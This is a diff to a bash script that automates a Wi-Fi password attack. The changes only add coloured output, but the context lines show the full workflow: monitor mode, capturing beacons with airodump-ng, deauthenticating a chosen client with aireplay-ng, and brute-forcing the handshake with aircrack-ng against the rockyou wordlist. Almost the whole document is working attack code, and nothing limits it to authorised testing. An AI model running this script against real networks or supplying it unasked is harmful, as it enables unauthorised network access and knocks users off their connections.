@@ -7,6 +7,9 @@ fi
 
 wordlist="/usr/share/wordlists/rockyou.txt"
 interface=$(iw dev | awk '$1=="Interface"{print $2}')
+RED='\033[0;31m'
+NC='\033[0m'
+GREEN='\033[0;32m'
 
 while getopts w: option
 do
@@ -17,9 +20,9 @@ esac
 done
 
 if [[ $interface = *"mon"* ]]; then
-        echo "[*] Monitoring interface detected. Stopping wlan0mon..."
+        echo -e "${GREEN}[*]${NC} Monitoring interface detected. Stopping wlan0mon..."
         airmon-ng stop $interface > /dev/null 2>&1
-        echo "[*] Restarting network manager service..."
+        echo -e "${GREEN}[*]${NC} Restarting network manager service..."
         service network-manager restart > /dev/null 2>&1
         echo " "
 fi
@@ -29,7 +32,7 @@ monint="${interface}mon"
 
 nmcli -f SSID,BSSID,ACTIVE,RATE,BARS,SECURITY dev wifi list
 echo " "
-echo -n "Enter a SSID or BSSID: "
+echo -n -e "${GREEN}[*]${NC} Enter a SSID or BSSID: "
 read input
 isbssid=0
 
@@ -43,7 +46,7 @@ else
 fi
 
 if [ -z "$bssid" ]; then
-	echo -n "Network not found. Re-enter SSID/BSSID: "
+	echo -n -e "${RED}[*]${NC} Network not found. Re-enter SSID/BSSID: "
 	read retry
 	input=$retry
 else
@@ -53,11 +56,11 @@ done
 
 ch=$(nmcli -f SSID,BSSID,CHAN dev wifi list | grep $bssid | xargs | cut -d " " -f 3)
 
-echo "[*] Killing processes that might cause conflict issues..."
+echo -e "${GREEN}[*]${NC} Killing processes that might cause conflict issues..."
 airmon-ng check kill > /dev/null 2>&1
-echo "[*] Putting $interface in monitor mode..."
+echo -e "${GREEN}[*]${NC} Putting $interface in monitor mode..."
 airmon-ng start $interface > /dev/null 2>&1
-echo "[*] Capturing beacons in a new terminal tab..."
+echo -e "${GREEN}[*]${NC} Capturing beacons in a new terminal tab..."
 echo "$bssid $ch $monint" > .args.txt
 if [ ! -d "output" ]; then
 	mkdir output/
@@ -65,22 +68,22 @@ else
 	rm -f output/*
 fi
 gnome-terminal --tab -e 'sh -c "airodump-ng --bssid \$(cat .args.txt | cut -d \" \" -f 1) --channel \$(cat .args.txt | cut -d \" \" -f 2) --write output/output \$(cat .args.txt | cut -d \" \" -f 3); exec bash"' &> /dev/null
-echo -n "[!] Enter a client BSSID you wish to deauthenticate: "
+echo -n -e "${GREEN}[!]${NC} Enter a client BSSID you wish to deauthenticate: "
 read client
 while true;
 do
 if [[ $client =~ ^([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}$ ]]; then
 	break
 else
-	echo -n "[!] Invalid client BSSID. Re-enter: "
+	echo -n -e "${RED}[!]${NC} Invalid client BSSID. Re-enter: "
 	read cretry
 	client=$cretry
 fi
 done
 
-echo "[*] Deauthenticating $client..."
+echo -e "${GREEN}[*]${NC} Deauthenticating $client..."
 aireplay-ng -0 1 -a $bssid -c $client $monint > /dev/null 2>&1
-read -p "[*] Press ENTER when ready to brute force. The more beacons, the better signal quality..."
-echo "[*] Starting attack..."
+read -p $'\e[32m[*]\e[0m Press ENTER when ready to brute force. The more beacons, the better signal quality...'
+echo -e "${GREEN}[*]${NC} Starting attack..."
 rm .args.txt
 aircrack-ng -w $wordlist -b $bssid output/output*.cap
